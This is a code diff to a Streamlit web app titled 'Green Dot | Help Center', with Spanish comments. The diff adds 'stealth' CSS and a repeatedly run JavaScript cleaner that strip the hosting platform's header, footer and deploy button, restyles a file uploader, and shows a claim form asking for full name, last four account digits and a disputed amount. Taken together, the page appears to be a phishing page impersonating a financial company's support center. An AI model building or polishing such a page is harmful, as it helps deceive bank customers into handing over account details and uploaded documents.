@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR V1.2.5 (LIMPIEZA DE CONTENEDORES ESPECÍFICOS)
+# JS NUCLEAR V1.2.6 (CONTROL DE WIDGETS DE CARGA)
 st.markdown("""<script>
     const nuclearClean = () => {
         const toHide = [
@@ -36,48 +36,55 @@ st.markdown("""<script>
             document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
         });
 
-        // Forzar fondo negro en contenedores rebeldes (Especialmente h5555q)
+        // Forzar visibilidad de widgets de subida (FileUpload)
+        document.querySelectorAll('[data-testid="stFileUploader"]').forEach(el => {
+            el.style.backgroundColor = '#1a1a1a';
+            el.style.border = '1px solid #333';
+            el.style.borderRadius = '8px';
+            el.style.padding = '10px';
+        });
+
         document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
             el.style.backgroundColor = '#000000';
             el.style.color = '#FFFFFF';
             el.style.border = 'none';
-            el.style.boxShadow = 'none';
         });
     };
     setInterval(nuclearClean, 30);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH TOTAL V1.2.5
+# CSS STEALTH TOTAL V1.2.6
 st.markdown("""<style>
-    /* BLINDAJE NEGRO ABSOLUTO GLOBAL Y ESPECÍFICO */
-    html, body, [data-testid="stAppViewContainer"], .stApp, 
-    .st-emotion-cache-h5555q, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
+    /* BLINDAJE NEGRO ABSOLUTO */
+    html, body, [data-testid="stAppViewContainer"], .stApp {
         background-color: #000000 !important;
         color: #FFFFFF !important;
     }
 
-    /* ELIMINACIÓN DE BORDES Y SOMBRAS EN h5555q PARA EVITAR ARTEFACTOS EN MÓVIL */
-    .st-emotion-cache-h5555q {
-        border: none !important;
-        box-shadow: none !important;
-        outline: none !important;
-        background: #000000 !important;
+    /* FIX ESPECÍFICO PARA UPLOAD (MODO CLARO) */
+    [data-testid="stFileUploader"] {
+        background-color: #1a1a1a !important;
+        padding: 15px !important;
+        border-radius: 10px !important;
+        border: 1px solid #444 !important;
     }
 
-    [data-testid="stMarkdownContainer"] p { color: #FFFFFF !important; }
-    * { color: #FFFFFF !important; }
-
-    /* OCULTAR ELEMENTOS DE INTERFAZ */
-    [data-testid="stHeaderActionElements"], .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3 {
-        display: none !important;
-        visibility: hidden !important;
+    [data-testid="stFileUploader"] section {
+        background-color: #222 !important;
+        color: white !important;
     }
 
+    [data-testid="stMarkdownContainer"] p, label, .st-ae {
+        color: #FFFFFF !important;
+    }
+
+    /* FORZAR ESTADO EN LIGHT MODE */
     @media (prefers-color-scheme: light) {
         html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-h5555q {
             background-color: #000000 !important;
             color: #FFFFFF !important;
         }
+        [data-testid="stFileUploader"] section { background-color: #222 !important; }
     }
 
     header, footer, .stDeployButton { display: none !important; }
@@ -98,7 +105,7 @@ st.markdown("""<style>
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
 
-with st.form("claim_v1_2_5_final", clear_on_submit=True):
+with st.form("claim_v1_2_6_final", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
